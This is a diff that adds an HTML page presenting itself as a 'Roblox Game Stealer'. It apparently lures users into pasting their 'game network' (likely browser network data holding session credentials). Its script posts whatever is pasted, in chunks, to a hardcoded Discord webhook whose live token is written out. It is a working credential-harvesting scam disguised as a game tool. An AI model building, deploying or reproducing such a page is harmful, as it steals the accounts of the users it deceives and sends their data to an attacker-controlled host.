@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Game Stealer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.9); /* Slightly transparent white background */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Roblox Game Stealer</h1>
+        <input type="text" id="messageBox" placeholder="Enter game network">
+        <button onclick="sendMessage()">Apply</button>
+    </div>
+
+    <script>
+        function sendMessage() {
+            const message = document.getElementById('messageBox').value;
+            const webhookUrl = 'https://discord.com/api/webhooks/1267491056618967230/PgXgeRiakRLIm3Ko18KdcTcqRaAWP2iqw01UGwuBA1kJj_KHo2PU95QASntX_UaGNepk'; // Replace with your actual webhook URL
+
+            const maxLength = 2000; // Discord's message character limit
+            const messages = [];
+
+            // Split the message into chunks if it exceeds the character limit
+            for (let i = 0; i < message.length; i += maxLength) {
+                messages.push(message.substring(i, i + maxLength));
+            }
+
+            const sendChunk = (index) => {
+                if (index >= messages.length) return;
+                
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: messages[index] })
+                }).then(response => {
+                    if (response.ok) {
+                        if (index < messages.length - 1) {
+                            sendChunk(index + 1); // Send the next chunk
+                        } else {
+                            alert('Network sent!');
+                        }
+                    } else {
+                        alert('Error sending network.');
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending network.');
+                });
+            };
+
+            sendChunk(0); // Start sending chunks
+        }
+    </script>
+</body>
+</html>
